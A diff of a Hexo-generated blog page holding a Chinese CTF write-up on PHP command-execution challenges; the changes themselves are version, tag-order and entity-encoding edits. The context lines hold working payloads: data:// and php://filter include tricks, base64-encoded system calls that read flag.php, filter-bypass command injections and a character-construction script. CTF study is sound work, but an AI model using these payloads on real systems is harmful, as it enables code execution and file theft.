@@ -47,7 +47,7 @@ if(isset($_GET[&#39;">
 
     <script src="./libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.2"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="./atom.xml" title="远离尘世的幻想乡" type="application/atom+xml">
 </head>
 
 
@@ -522,12 +522,12 @@ if(isset($_GET[&#39;">
                     
                     <div class="article-tag">
                         
-                            <a href="./tags/CTF/">
-                                <span class="chip bg-color">CTF</span>
-                            </a>
-                        
                             <a href="./tags/Web/">
                                 <span class="chip bg-color">Web</span>
+                            </a>
+                        
+                            <a href="./tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
                             </a>
                         
                             <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -573,7 +573,7 @@ if(isset($_GET[&#39;">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2.3k
+                    2.4k
                 </div>
                 
 
@@ -686,10 +686,10 @@ encode/resource=flag.php
 c=include$_GET[1]?>&amp;1=data://text/plain,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>
 c=include$_GET[1]?>&amp;1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Web33-36-0-9"><a href="#Web33-36-0-9" class="headerlink" title="Web33-36 [0-9]|/"></a>Web33-36 [0-9]|/</h2><p>33新增双引号</p>
+<h2 id="Web33-36-0-9-x2F"><a href="#Web33-36-0-9-x2F" class="headerlink" title="Web33-36 [0-9]|&#x2F;"></a>Web33-36 [0-9]|&#x2F;</h2><p>33新增双引号</p>
 <p>34新增冒号</p>
-<p>35新增&lt;|=</p>
-<p>36新增/|[0-9]</p>
+<p>35新增&lt;|&#x3D;</p>
+<p>36新增&#x2F;|[0-9]</p>
 <p>payload</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php">c=include$_GET[a]?>&amp;1=php://filter/read=convert.base64-encode/resource=flag.php
 c=include$_GET[a]?>&amp;1=data://text/palin,<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nl flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -752,7 +752,7 @@ c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span ari
 
 <p>括号检测的是中文括号。基本思路就是不带字符串不带数字纯函数读取。</p>
 <blockquote>
-<p>current()函数返回数组中的当前元素/单元，默认取第一个值<br>pos()函数同上，是current()函数的别名<br>reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE</p>
+<p>current()函数返回数组中的当前元素&#x2F;单元，默认取第一个值<br>pos()函数同上，是current()函数的别名<br>reset()函数，当数组不为空时返回数组第一个单元的值，如果数组为空则返回FALSE</p>
 </blockquote>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//查看当下目录</span>
 <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token function">current</span><span class="token punctuation">(</span><span class="token function">localeconv</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -772,7 +772,7 @@ c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span ari
     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>此题过滤了<code>$、+、-、^、~</code>，导致异或/自增/取反构造字符都无法在使用，但留了个运算符<code>|</code></p>
+<p>此题过滤了<code>$、+、-、^、~</code>，导致异或&#x2F;自增&#x2F;取反构造字符都无法在使用，但留了个运算符<code>|</code></p>
 <p>脚本：</p>
 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token comment">/*
@@ -860,7 +860,7 @@ c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span ari
 
 <span class="token function">generate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<h2 id="Web42-52-gt-dev-null"><a href="#Web42-52-gt-dev-null" class="headerlink" title="Web42-52 &gt;/dev/null"></a>Web42-52 &gt;/dev/null</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<h2 id="Web42-52-gt-x2F-dev-x2F-null"><a href="#Web42-52-gt-x2F-dev-x2F-null" class="headerlink" title="Web42-52 &gt;&#x2F;dev&#x2F;null"></a>Web42-52 &gt;&#x2F;dev&#x2F;null</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
     <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" >/dev/null 2>&amp;1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@@ -869,7 +869,7 @@ c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==<span ari
 <span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <blockquote>
-<p>/dev/null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
+<p>&#x2F;dev&#x2F;null 2&gt;&amp;1，让所有的输出流（包括错误的和正确的）都定向到空设备丢弃</p>
 </blockquote>
 <p>要将后面的截断,命令加个<code>%0a</code>或者<code>%26</code>或<code>||</code></p>
 <p><strong>Web43</strong>新增正则检测cat，换个如<code>nl</code>、<code>tac</code>读取命令即可</p>
@@ -925,7 +925,7 @@ payload9:c&#x3D;nl%09fla\g.php%26<span aria-hidden="true" class="line-numbers-ro
 </blockquote>
 <p>payload:</p>
 <p>方法一：</p>
-<p>匹配/bin/base64 /flag.php</p>
+<p>匹配&#x2F;bin&#x2F;base64 &#x2F;flag.php</p>
 <pre class="line-numbers language-none"><code class="language-none">?c&#x3D;&#x2F;???&#x2F;????64%20????.???<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>非通用，base64并非每个机子都有</p>
@@ -1112,12 +1112,12 @@ POST:v1&#x3D;hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></s
                     
                         <div class="article-tag">
                             
-                                <a href="./tags/CTF/">
-                                    <span class="chip bg-color">CTF</span>
-                                </a>
-                            
                                 <a href="./tags/Web/">
                                     <span class="chip bg-color">Web</span>
+                                </a>
+                            
+                                <a href="./tags/CTF/">
+                                    <span class="chip bg-color">CTF</span>
                                 </a>
                             
                                 <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -1475,12 +1475,12 @@ POST:v1&#x3D;hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/disable-functions/">
@@ -1532,12 +1532,12 @@ POST:v1&#x3D;hex2bin<span aria-hidden="true" class="line-numbers-rows"><span></s
                 
                 <div class="card-action article-tags">
                     
-                    <a href="./tags/CTF/">
-                        <span class="chip bg-color">CTF</span>
-                    </a>
-                    
                     <a href="./tags/Web/">
                         <span class="chip bg-color">Web</span>
+                    </a>
+                    
+                    <a href="./tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
                     </a>
                     
                     <a href="./tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
